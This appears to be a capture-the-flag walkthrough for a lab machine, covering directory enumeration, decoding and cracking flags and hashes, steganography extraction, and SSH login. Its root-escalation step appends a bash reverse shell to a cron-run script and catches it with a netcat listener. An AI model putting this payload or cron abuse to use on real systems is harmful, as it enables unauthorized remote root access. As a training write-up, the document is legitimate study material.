# Notes: Flag Discovery & Privilege Escalation

### 1. Web Enumeration & Initial Flags
*   **Directory Discovery**: After finding the `/hidden` directory using `gobuster`, further enumerate to find `/hidden/whatever`.
*   **Flag 1**: In `/hidden/whatever`, the page source contains encoded text.
    ```bash
    echo "ZmxhZ3tmMXJzN19mbDRnfQ" | base64 -d
    # Result: flag{f1rs7_fl4g}
    ```
*   **Flag 2**: Located in the Apache port `robots.txt` file at `http://10.201.91.87:65524/robots.txt`.
    *   **User-Agent**: `a18672860d0510e5ab6699730763b250` (MD5 hash)
    *   **Unhashed value**: `flag{1m_s3c0nd_fl4g}`
*   **Flag 3**: Found directly in the page source of `http://10.201.91.87:65524`.
    *   **Value**: `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

---

### 2. Hash Cracking & Hidden Directories
*   **Hidden String**: Found in the page source of `http://10.201.91.87:65524`:
    *   `<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>`
*   **Decoding**: Use CyberChef (Base64). 
    *   **Decoded Result**: `/n0th1ng3ls3m4tt3r`
*   **Accessing Hidden Path**: `http://10.201.89.171:65524/n0th1ng3ls3m4tt3r/`
*   **Hash Cracking**: A hash was found on the page: `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`.
    ```bash
    john --format=gost --wordlist=/home/kali/Downloads/easypeasy_1596838725703.txt --rules /home/kali/pass.txt
    # Result: mypasswordforthatjob
    ```

---

### 3. Steganography & Binary Decryption
*   **Stegseek**: Use the wordlist to extract data from `poo.jpeg` found in the hidden directory.
    ```bash
    stegseek poo.jpeg easypeasy_1596838725703.txt
    ```
*   **Extracted Credentials**:
    *   **Username**: `boring`
    *   **Password (Binary)**: `01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001`
*   **Decrypted Password**: `iconvertedmypasswordtobinary`

---

### 4. SSH Access & Flag Recovery
*   **SSH Login**: Connect using the non-standard port.
    ```bash
    ssh boring@10.201.89.171 -p 6498
    ```
*   **User Flag**: The flag in the user directory is encoded with **ROT13**. Flip it back to read the cleartext.

---

### 5. Privilege Escalation (Root)
*   **Check Cron Jobs**: 
    ```bash
    cat /etc/crontab
    ```
*   **Exploitation**: Identify a hidden file, locate it in `/var/www`, and append a reverse shell payload:
    ```bash
    echo "bash -i >& /dev/tcp/<myip>/4444 0>&1" >> /var/www/<hidden_file>
    ```
*   **Listener**: On your local machine, start a Netcat listener:
    ```bash
    nc -lvnp 4444
    ```
*   **Root Access**: Once the shell connects, navigate to the root directory and capture the final flag:
    ```bash
    cd /root
    cat .root.txt
